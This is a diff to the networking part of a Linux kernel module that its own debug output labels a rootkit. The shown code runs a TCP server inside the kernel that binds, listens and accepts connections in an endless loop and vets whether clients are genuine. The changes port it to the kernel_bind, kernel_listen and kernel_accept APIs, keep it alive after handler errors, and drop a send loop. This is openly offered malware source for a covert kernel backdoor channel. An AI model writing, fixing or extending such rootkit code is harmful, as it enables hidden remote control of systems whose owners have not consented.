@@ -12,7 +12,8 @@
 
 #include <linux/string.h>
 
-#include "networking.h"
+#include "server.h"
+
 
 	/*=============*\
 		networking
@@ -21,7 +22,7 @@ struct client_t{ //structure holding client information
 	struct socket *sock; //structure holding socket object
 	struct kvec sock_vec; //holds vector of data recieved
 	struct msghdr sock_msg; //structure to hold data recieved
-	char *message=NULL; //structure to hold message sent or recieved
+	char *message; //structure to hold message sent or recieved
 };
 
 struct server_t{
@@ -58,20 +59,20 @@ static int run_server(void *port){ //runs the server
 		printk(KERN_DEBUG "[rootkit] net_connect- server socket creation error!- %d\n", err); //print debug info
 		return err; //returns -1 for error
 	}
-	err = server.sock->ops->bind(server.sock, (struct sockaddr *)&(server.s_addr), sizeof(server.s_addr)); //binds server
+	err = kernel_bind(server.sock, (struct sockaddr *)&(server.s_addr),sizeof(struct sockaddr_in)); //binds server
 	if (err<0){ //if error binding
 		printk(KERN_DEBUG "[rootkit] run_server- server bind error!- %d\n", err); //prints debug info
 		return err; //returns -1 for error
 	}
 
-	err = server.sock->ops->listen(server.sock, 1); //listens for connections with 1 backlog
+	err = kernel_listen(server.sock, 1); //listens for connections with 1 backlog
 	if (err<0){ //if error listening
 		printk(KERN_DEBUG "[rootkit] run_server- server accept error!- %d\n", err); //prints debug info
 		return err; //returns -1 for error
 	}
 
 	while(true){
-		err = server.sock->ops->accept(server.sock, client.sock, 0, 0); //accepts connection
+		err = kernel_accept(server.sock, &(client.sock), 1); //accepts connection
 		if (err<0){ //if error accepting conn
 			printk(KERN_DEBUG "[rootkit] run_server- server accept error!- %d\n", err); //prints debug info
 			return err; //returns -1 for error
@@ -80,7 +81,6 @@ static int run_server(void *port){ //runs the server
 		err = client_handler();
 		if (err<0){ //if error with handling
 			printk(KERN_DEBUG "[rootkit] run_server- client handle error!- %d\n", err); //prints debug info
-			return err; //returns -1 for error
 		}
 	}
 	return 0; //return 0  for no errors
@@ -169,27 +169,5 @@ static int client_handler(void){
 		printk(KERN_DEBUG "[rootkit] handle_client: client is a fake\n%s", client.message); //print debug info
 		return -1; //return -1 for error
 	}
-	while(true){
-		if(strlen(client.message)>0){
-			net_send();
-			memset(client.message, 0, sizeof(client.message)); //zeroes out message buffer
-		}
-	}
 	return 0; //return 0 for no errors
-}
-
-static int client_print(char *message){
-	/*
-	while(true){ //infinite loop that waits till able to write to message
-		if(message==0){ //if able to write to message because no current message
-			strcpy(client.message, message); //copies basic auth message into buffer
-			return 0; //returns
-		}
-		printk("message to be printed = %s     message length = %d", message, strlen(client.message));
-	}
-	*/
-	//strcpy(client.message, message);
-	//net_send();
-	printk("%s", message);
-	return 0;
 }
